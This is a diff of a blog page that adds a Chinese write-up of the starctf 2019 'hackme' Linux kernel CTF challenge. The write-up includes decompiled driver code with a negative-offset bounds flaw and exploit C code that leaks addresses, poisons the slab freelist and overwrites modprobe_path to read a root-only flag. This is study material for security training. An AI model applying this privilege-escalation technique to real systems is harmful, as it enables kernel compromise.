@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Linux kernel pwn,pwn,CTF," />
 
 
 
@@ -79,14 +79,18 @@
 
 
 
+<meta name="description" content="starctf 2019的一道kernel pwn的题目。照着官方和p4nda大佬的exp复盘一下。">
+<meta name="keywords" content="Linux kernel pwn,pwn,CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hackme">
+<meta property="og:title" content="starctf 2019 hackme">
 <meta property="og:url" content="http://x3h1n.github.io/2019/10/24/hackme/index.html">
 <meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="starctf 2019的一道kernel pwn的题目。照着官方和p4nda大佬的exp复盘一下。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-10-24T03:00:09.124Z">
+<meta property="og:updated_time" content="2019-12-08T04:07:47.870Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hackme">
+<meta name="twitter:title" content="starctf 2019 hackme">
+<meta name="twitter:description" content="starctf 2019的一道kernel pwn的题目。照着官方和p4nda大佬的exp复盘一下。">
 
 
 
@@ -122,7 +126,7 @@
 
 
 
-  <title>hackme | X3h1n</title>
+  <title>starctf 2019 hackme | X3h1n</title>
   
 
 
@@ -256,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">hackme</h1>
+          <h1 class="post-title" itemprop="name headline">starctf 2019 hackme</h1>
         
 
         <div class="post-meta">
@@ -306,7 +310,25 @@
       
 
       
-        
+        <p>starctf 2019的一道kernel pwn的题目。照着官方和p4nda大佬的exp复盘一下。<br><a id="more"></a></p>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题目提供了四个功能，类似于堆的管理，add、show、edit和delete，在hackme_ioctl函数中。在整个交互过程中涉及到两个结构体，一个是用户参数结构体args，一个是存储堆块信息的结构体，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00000000 note_unit       struc ; (sizeof=0x10, mappedto_3)</span><br><span class="line">00000000 ptr             dq ?</span><br><span class="line">00000008 size            dq ?</span><br><span class="line">00000010 note_unit       ends</span><br><span class="line">00000010</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 args            struc ; (sizeof=0x20, mappedto_4)</span><br><span class="line">00000000 idx             dq ?</span><br><span class="line">00000008 user_ptr        dq ?</span><br><span class="line">00000010 size            dq ?</span><br><span class="line">00000018 offset          dq ?</span><br><span class="line">00000020 args            ends</span><br></pre></td></tr></table></figure></p>
+<p>首先看add note功能，根据用户参数size调用_kmalloc函数动态分配，pool全局数组中存储note_unit数据结构。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 != <span class="number">0x30000</span> )                          <span class="comment">// add</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">size = args_size;</span><br><span class="line">user_ptr = args_user_ptr;</span><br><span class="line">v12 = (note_unit *)&amp;pool[<span class="number">2</span> * v19];</span><br><span class="line"><span class="keyword">if</span> ( v12-&gt;ptr )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">v18 = _kmalloc(args_size, <span class="number">0x6000C0</span>LL);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">v12-&gt;ptr = v18;</span><br><span class="line">copy_from_user(v18, user_ptr, size);</span><br><span class="line">v12-&gt;size = size;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure></p>
+<p>edit note功能中根据索引进行edit，这里有一个漏洞，在edit时会进行检查，当args_offset + args_size小于等于pool全局数组中存储的size（add时的size），整个check虽然保证了不能向后越界，但是如果args_offset是负数时，同样可以通过check，就可以覆写目标note前面的内容。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">0x30002</span> )                        <span class="comment">// edit</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">2L</span>L * v19;</span><br><span class="line">      v10 = pool[v9];</span><br><span class="line">      v11 = (note_unit *)&amp;pool[v9];</span><br><span class="line">      <span class="keyword">if</span> ( v10 &amp;&amp; (<span class="keyword">unsigned</span> __int64)(args_offset + args_size) &lt;= v11-&gt;size )<span class="comment">// vul here</span></span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user(args_offset + v10, args_user_ptr, args_size);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>同样在show note中，也有一个同样的check，但是同样阻止不了向前泄露。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">0x30003</span> )                   <span class="comment">// show</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">2L</span>L * v19;</span><br><span class="line">      v6 = pool[v5];</span><br><span class="line">      v7 = (note_unit *)&amp;pool[v5];</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(args_offset + args_size) &lt;= v7-&gt;size )<span class="comment">// vul here</span></span><br><span class="line">        &#123;</span><br><span class="line">          copy_to_user(args_user_ptr, args_offset + v6, args_size);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>delete note 根据索引进行删除：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">0x30001</span> )                          <span class="comment">// delete</span></span><br><span class="line"> &#123;</span><br><span class="line">   v15 = <span class="number">2L</span>L * v19;</span><br><span class="line">   v16 = pool[v15];</span><br><span class="line">   v17 = (note_unit *)&amp;pool[v15];</span><br><span class="line">   <span class="keyword">if</span> ( v16 )</span><br><span class="line">   &#123;</span><br><span class="line">     kfree(v16, v4);</span><br><span class="line">     v17-&gt;ptr = <span class="number">0L</span>L;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这样其实我们的漏洞已经出来了，利用show和edit拥有了向前任意地址读写的能力。</p>
+<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>官方exp里利用了修改modprobe_path，然后利用一个格式错误的ELF文件触发，从而读取flag。<br>这里涉及到了内核的动态内存分配，对于小块内存是基于slab分配器来进行分配的，对于相同大小的空闲内存块，它以先进后出的单链表的形式存储，堆块的首地址指向下一个空闲的相同大小的内存块，偏移0x8处存储大小。<br>首先初始化分配5个大小为0x100的堆块。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memset</span>(mem,<span class="string">'a'</span>,<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//kmalloc</span></span><br><span class="line">add_note(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">memset</span>(mem,<span class="string">'b'</span>,<span class="number">0x100</span>);</span><br><span class="line">add_note(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">add_note(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">add_note(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">add_note(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure></p>
+<p>当删除了note1和note3之后，空闲链表是note3-&gt;note1，此时我们可以通过show note4将note3的fd指针进行泄露，这样泄露了堆地址，其实是note1的起始地址。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//leak heap addr</span></span><br><span class="line">show_note(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>); <span class="comment">//leak chunk1 base</span></span><br><span class="line">heap_addr = *((<span class="keyword">size_t</span> *)mem);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]heap_addr: 0x%lx\n"</span>,heap_addr);</span><br></pre></td></tr></table></figure></p>
+<p>内核基址的泄露可以通过在note0向前寻找，这里存储着一些内核申请的系统堆块，可能存在一些内核地址，这里使用的是sysctl_table_root这个变量的地址，它是一个类型为ctl_table_root的结构体：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /20gx 0xffff8a1a40188500-0x200</span><br><span class="line">0xffff8a1a40188300:	0xffff8a1a40188378	0x0000000100000000</span><br><span class="line">0xffff8a1a40188310:	0x0000000000000001	0x0000000000000000</span><br><span class="line">0xffff8a1a40188320:	0xffff8a1a40188378	0xffffffffb5e49ae0</span><br><span class="line">0xffff8a1a40188330:	0xffffffffb5e49ae0	0xffff8a1a40015100</span><br><span class="line">0xffff8a1a40188340:	0xffff8a1a40188358	0x0000000000000000</span><br><span class="line"></span><br><span class="line">/ # cat /proc/kallsyms | grep ffffffffb5e49ae0</span><br><span class="line">ffffffffb5e49ae0 d sysctl_table_root</span><br></pre></td></tr></table></figure></p>
+<p>对应exp中的内容如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//leak kernel addr</span></span><br><span class="line"><span class="built_in">memset</span>(mem,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">show_note(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">kernel_addr = *((<span class="keyword">size_t</span> *)(mem+<span class="number">0x28</span>)); <span class="comment">//sysctl_table_root</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"leak sysctl_table_root addr: 0x%lx\n"</span>,kernel_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(kernel_addr &amp; <span class="number">0xfff</span> != <span class="number">0xae0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-]kernel addr leak failed [0x%lx]\n"</span>,kernel_addr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">kernel_addr -= <span class="number">0x849ae0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"kernel_addr: 0x%lx\n"</span>,kernel_addr);</span><br></pre></td></tr></table></figure></p>
+<p>泄露了地址之后，我们如果要进行任意地址读写，在glibc中的fastbin attack中，通常是修改fd指针，然后多次分配分配到目标地址，然后进行覆写。同样在内核中也是这样利用。利用edit note4就可以修改note3的fd指针，这里将fd修改为mod_tree+0x40，分配两次分配到mod_tree+0x40这块内存，mod_tree+0x18处存储了模块加载基址，因为我们可以向前泄露，所以可以分配mod_tree+0x40处，然后设置offset为负数，向前泄露模块加载基址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ # lsmod   </span><br><span class="line">hackme 16384 - - Live 0xffffffffc03ea000 (O)   //module_base</span><br><span class="line">/ # cat /proc/kallsyms | grep mod_tree</span><br><span class="line">ffffffffb566df00 t __mod_tree_remove</span><br><span class="line">ffffffffb566e720 t __mod_tree_insert</span><br><span class="line">ffffffffb5e11000 d mod_tree</span><br><span class="line">gdb-peda$ x /8gx 0xffffffffb5e11000</span><br><span class="line">0xffffffffb5e11000:	0x0000000000000006	0xffffffffc03ec320</span><br><span class="line">0xffffffffb5e11010:	0xffffffffc03ec338	0xffffffffc03ea000   //here</span><br><span class="line">0xffffffffb5e11020:	0xffffffffc03f0000	0x0000000000000000</span><br><span class="line">0xffffffffb5e11030:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>对应exp的内容如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//modify idx3-&gt;fd to alloc mod_tree_addr+0x40</span></span><br><span class="line"><span class="built_in">memset</span>(mem,<span class="string">'a'</span>,<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//cat /proc/kallsyms | grep mod_tree</span></span><br><span class="line">mod_tree_addr = kernel_addr + <span class="number">0x811000</span>;</span><br><span class="line">*((<span class="keyword">size_t</span> *)mem) = (mod_tree_addr + <span class="number">0x40</span>); <span class="comment">//mod_tree+0x40</span></span><br><span class="line">edit_note(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>); <span class="comment">//write idx3-&gt;fd</span></span><br><span class="line">add_note(fd,<span class="number">5</span>,mem,<span class="number">0x100</span>); <span class="comment">//idx5 == idx3</span></span><br><span class="line">add_note(fd,<span class="number">6</span>,mem,<span class="number">0x100</span>); <span class="comment">//alloc mod_tree+0x40</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//leak code_base</span></span><br><span class="line"><span class="built_in">memset</span>(mem,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">show_note(fd,<span class="number">6</span>,mem,<span class="number">0x40</span>,<span class="number">-0x40</span>);</span><br><span class="line">code_base = *((<span class="keyword">size_t</span> *)(mem+<span class="number">0x18</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]mod_tree_addr: 0x%lx\n"</span>,code_base);</span><br></pre></td></tr></table></figure></p>
+<p>再次修改fd指针指向bss段上的全局数组pool，pool数组上存储了note的地址和大小，通过修改pool可以将note的地址修改为我们的目标地址，以达到任意地址写的目的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//modify idx5-&gt;fd to bss_pool+0xc0</span></span><br><span class="line">delete_note(fd,<span class="number">2</span>);</span><br><span class="line">delete_note(fd,<span class="number">5</span>); <span class="comment">//idx5 == idx3</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">size_t</span> bss_pool = code_base + <span class="number">0x2400</span>;</span><br><span class="line">*((<span class="keyword">size_t</span> *)mem) = bss_pool + <span class="number">0xc0</span>;</span><br><span class="line">edit_note(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>); <span class="comment">//modify idx5-&gt;fd to bss_pool+0xc0</span></span><br><span class="line">add_note(fd,<span class="number">7</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">add_note(fd,<span class="number">8</span>,mem,<span class="number">0x100</span>); <span class="comment">//alloc bss_pool</span></span><br></pre></td></tr></table></figure></p>
+<p>然后通过edit note8将pool+0xc0修改为modprobe_path所在地址，然后edit note 0xc就可以覆写modprobe_path。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cat /proc/kallsyms | grep modprobe_path</span></span><br><span class="line"><span class="keyword">size_t</span> modprobe_path = kernel_addr + <span class="number">0x83f960</span>;</span><br><span class="line">*((<span class="keyword">size_t</span> *)(mem + <span class="number">0x8</span>)) = <span class="number">0x100</span>;</span><br><span class="line">*((<span class="keyword">size_t</span> *)mem) = (modprobe_path);</span><br><span class="line">edit_note(fd,<span class="number">8</span>,mem,<span class="number">0x10</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这里将modprobe_path修改为/home/pwn/copy.sh这个脚本，这个脚本的作用是将目标flag复制到/home/pwn/flag路径下，并修改其权限为777，非root模式下也可以读取，然后生成一个二进制文件/home/pwn/dummy，并将其起始的四个字节修改为’\xff\xff\xff\xff’，然后执行这个二进制文件，ELF文件格式错误触发modprobe_path，得到复制的flag，然后读取flag。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//modprobe_path -&gt; "/home/pwn/copy.sh\0"</span></span><br><span class="line"><span class="built_in">strncpy</span>(mem,<span class="string">"/home/pwn/copy.sh\0"</span>,<span class="number">18</span>);</span><br><span class="line">edit_note(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">//write copy.sh and execute error elf</span></span><br><span class="line"><span class="comment">//execute /home/pwn/copy.sh </span></span><br><span class="line">system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/dummy"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/dummy"</span>);</span><br><span class="line">system(<span class="string">"/home/pwn/dummy"</span>);</span><br><span class="line">system(<span class="string">"cat /home/pwn/flag"</span>);</span><br></pre></td></tr></table></figure></p>
+<h2 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h2><p>说一下modprobe_path的工作过程。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://p4nda.top/2019/05/01/starctf-2019-hackme/" target="_blank" rel="noopener">http://p4nda.top/2019/05/01/starctf-2019-hackme/</a></p>
+
       
     </div>
     
@@ -320,6 +342,16 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux-kernel-pwn/" rel="tag"># Linux kernel pwn</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
       
 
       
@@ -339,6 +371,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/07/balsnCTF-2019-knote/" rel="prev" title="balsnCTF 2019 knote">
+                balsnCTF 2019 knote <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -390,8 +426,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -406,7 +451,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -442,6 +487,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目描述"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用过程"><span class="nav-number">2.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#modprobe-path"><span class="nav-number">2.1.</span> <span class="nav-text">modprobe_path</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
